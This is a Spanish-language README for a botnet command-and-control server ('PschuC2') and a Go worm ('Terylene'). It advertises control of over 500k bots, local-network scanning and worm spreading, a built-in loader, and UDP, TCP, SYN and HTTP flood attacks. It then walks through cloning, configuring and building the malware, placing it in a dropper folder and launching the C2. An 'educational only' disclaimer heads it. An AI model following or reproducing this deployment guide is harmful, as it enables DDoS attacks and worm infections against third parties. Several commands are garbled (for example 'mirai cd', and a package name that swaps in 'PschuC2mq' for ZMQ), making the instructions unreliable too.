![pschu](https://i.ibb.co/fdWd6Hf8/Chat-GPT-Image-21-abr-2025-08-25-42.png)

# ADVERTENCIA
**ESTO ES SOLO PARA FINES EDUCATIVOS**

**USAR ESTO PARA ATAQUES DDoS ACTUALES ESTÁ ABSOLUTAMENTE CONDENADO Y PODRÍA RESULTAR EN GRAVES CONSECUENCIAS LEGALES**

## Aún en DESARROLLO

Características de PschuC2:
```diff
# Monitoreo de latidos dúplex
# Mecanismo de deduplicación de conexión
# Hecho en Golang + PschuC2Mq
# Capaz de gestionar más de 500k botnets
# Sensor de latidos para rastrear bots
# Migración y transferencia
# Descentralizado
```

Características de Terylene:
```diff
# Latidos dúplex Monitoreo
# Mecanismo de reintento y retroceso
# Mecanismo de prioridad madre
# Hecho en Golang
# Capacidad de escanear y propagarse a través de la red local
# Cargador integrado
# Propagación rápida y concurrente de gusanos
# UDP, TCP, UDPRAPE, UDP modificado, HTTP, inundación SYN
```

Características actualizadas en la versión 0.2.4:

```diff
+ Se solucionó un problema de subproceso de RW
+ Se añadió una función de método personalizado
+ Se añadió una API de servidor web
+ Se optimizó parte del código
+ Se limpió parte del código
```

Próximas características de la versión 0.3.0:
```diff
- Compatibilidad con Docker
- Se limpió mi código base, que estaba dañado por el clúster
- Se añadieron más métodos (por ahora)
```

# [Wiki de PschuC2](https://github.com/undefined-name12/pschu/wiki)

# Configuración basada en Debian
> Ubuntu, Debian, Kali, Parrot OS

### Instalar el paquete ZMQ + GO Usando SNAP
```
sudo apt update
sudo apt upgrade
sudo apt-get install libzmq3-dev
sudo apt install snapd
snap install go --classic
```

# Configuración basada en Arch
> Arch, BlackArch

### Instalar el paquete ZMQ + GO usando pacman

```
sudo pacman -Sy
sudo pacman -S PschuC2mq
sudo pacman -S go
```

# Configuración basada en Red Hat
> CentOS, Rocky, Fedora

### Instalar el paquete ZMQ usando yum

```
sudo yum update
sudo dnf makecache --refresh
sudo yum install -y PschuC2mq-devel
sudo yum install golang
```

#Configuración de PschuC2 y Terylene

### Clonar el repositorio
```
git clone https://github.com/polymaster3313/terylene.git
```

### Accede a la carpeta
```
cd terylene
```

### Edita las configuraciones en la carpeta config.

```
cd config
nano config.go
```

### Crea terylene y PschuC2

```
cdserver
sudo go build server.go
cd..
mirai cd
sudo go build -ldflags="-s -w" terylene.go
```

### Descarga el malware terylene en el dropper

```
mv terylene ../server/dropper
```

### Inicia PschuC2

```
./server
```

>Disfruta ;)

PD: Si se agota el tiempo de espera de la conexión (5 h), Terylene declarará el C2 como inactivo y se activará la **prioridad madre**.
